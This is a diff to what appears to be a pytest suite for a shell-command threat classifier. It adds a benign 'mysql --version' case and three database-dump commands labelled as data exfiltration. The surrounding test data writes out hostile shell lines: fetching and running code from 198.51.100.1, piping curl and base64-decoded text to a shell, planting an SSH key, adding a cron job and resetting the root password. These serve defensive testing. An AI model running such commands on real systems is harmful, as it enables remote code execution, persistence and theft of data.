@@ -22,6 +22,7 @@ from hubfakes import DROP, event_body, signed, stores  # noqa: F401  (stores is 
     "cat ~/.ssh/known_hosts",
     "echo hello | sha256sum",
     "cd ./logs",
+    "mysql --version",
 ])
 def test_ordinary_shell_use_never_alerts(command):
     category, score = classify_command(command)
@@ -32,6 +33,9 @@ def test_ordinary_shell_use_never_alerts(command):
     ("cd /tmp; wget http://198.51.100.1/x; chmod +x x; ./x", "payload_execution"),
     ("curl -s http://198.51.100.1/i.sh | sh", "payload_execution"),
     ("echo ZWNobyBoaQ== | base64 -d | bash", "payload_execution"),
+    ('mysql -h db-01 -u erp_admin -pX -e "select count(*) from erp.students;"', "data_exfiltration"),
+    ("mysqldump -u root -p erp > /tmp/erp.sql", "data_exfiltration"),
+    ('psql -h db-01 -U app -c "select * from users"', "data_exfiltration"),
     ('echo "ssh-ed25519 AAAA" >> ~/.ssh/authorized_keys', "persistence"),
     ('(crontab -l; echo "* * * * * /tmp/x") | crontab -', "persistence"),
     ("echo root:pw | chpasswd", "persistence"),
